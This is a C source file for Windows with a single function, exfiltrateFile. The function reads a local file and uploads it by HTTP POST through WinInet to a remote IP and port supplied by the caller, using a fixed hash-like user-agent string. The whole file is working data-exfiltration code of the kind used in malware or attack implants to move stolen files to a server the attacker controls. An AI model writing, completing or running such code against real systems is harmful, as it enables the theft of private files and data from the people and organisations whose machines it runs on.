#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include "info.h"
#include "fetchfile.h"

#pragma comment(lib, "wininet.lib")

int exfiltrateFile(char* ip, int port, LPCSTR lpFileName) {
    printf("%s Ip: %s\n", INFO, ip);
    printf("%s Port: %d\n", INFO, port);
    printf("%s File: %s\n", INFO, lpFileName);

    char* cUserAgent = "cd9b035ea86590c4769ee5275d301016";

    HANDLE hInternet = NULL;
    HANDLE hConnect = NULL;
    hInternet = InternetOpenA(cUserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("%s InternetOpen failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }

    printf("%s\n", ip);
    hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        printf("%s InternetConnect failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }

    FileData fileData = fetchFile(lpFileName);
    char* cPayload = fileData.cContent;
    size_t sFileSize = fileData.sContentSize;
    if (cPayload == NULL) {
        printf("%s fetchFile failed with error: 0x%x\n", ERROR, GetLastError());
    }
    printf("%s Payload: %s\n", INFO, cPayload);

    HANDLE hRequest = NULL;
    hRequest = HttpOpenRequestA(hConnect, "POST", lpFileName, "HTTP/1.0", "*/*", NULL, 0, 0);
    if (hRequest == NULL) {
        printf("%s HttpOpenRequest failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }

    char* headers = "Content-Type: multipart/form-data\r\n";
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), cPayload, sFileSize)) {
        printf("%s HttpSendRequest failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }
    printf("%s Successfully transfered file\n", SUCCESS);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(cPayload);
}
